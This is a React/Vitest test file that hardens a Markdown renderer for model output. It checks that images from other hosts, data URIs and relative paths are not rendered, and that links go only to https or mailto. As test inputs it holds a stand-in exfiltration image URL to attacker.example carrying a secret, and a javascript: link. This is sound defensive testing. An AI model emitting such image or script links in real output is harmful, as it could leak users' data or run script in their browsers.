import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown } from "./markdown";

// Model output rendered as Markdown can load nothing from another host and links
// only to https or mailto.
function render(markdown: string) {
  return renderToStaticMarkup(<Markdown mode="static">{markdown}</Markdown>);
}

describe("Markdown hardening", () => {
  it("does not render a model-output image from an external host", () => {
    const html = render("Here: ![chart](https://attacker.example/pixel.png?q=secret)");

    expect(html).not.toMatch(/<img/i);
    expect(html).not.toContain("attacker.example");
  });

  it("does not render a data or relative image either", () => {
    expect(render("![a](data:image/png;base64,iVBORw0KGgo=)")).not.toMatch(/<img/i);
    expect(render("![a](/api/chat/state)")).not.toMatch(/<img/i);
  });

  it("links only to https and mailto", () => {
    expect(render("[docs](https://findmeatime.com/help)")).toContain('href="https://findmeatime.com/help"');
    expect(render("[mail](mailto:host@example.com)")).toContain('href="mailto:host@example.com"');

    for (const url of ["http://insecure.example/", "javascript:alert(1)", "/app", "xmpp:someone@example.com"]) {
      expect(render(`[x](${url})`)).not.toContain(`href="${url}"`);
    }
  });
});
